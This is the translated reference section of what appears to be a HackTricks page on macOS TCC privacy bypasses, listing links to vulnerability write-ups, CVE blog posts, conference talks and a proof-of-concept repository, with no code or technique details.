- [11] [macOS 新漏洞“powerdir”可能导致未经授权访问用户数据](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [更改主目录并绕过 TCC，即 CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [播放音乐并绕过 TCC，即 CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [如何偷走一只 (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - 在 macOS 中使用 Telegram 绕过 TCC](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - 揭露 Apple 漏洞：dis​karbitrationd 和 storagekitd 审计（第二部分）](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0：合成点击与 CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - 概念验证](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - 在 OS X 上设置环境变量](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771：mount_apfs TCC bypass 与权限提升](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808：通过挂载覆盖 TCC 数据库绕过 TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [绕过 macOS 隐私机制的 20 多种方法](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [全面击败 TCC - 绕过 macOS 隐私机制的 20 多种新方法](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [从 Spotlight 到 Apple Intelligence——滥用 0day 窃取为 macOS AI 提供数据的攻击](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
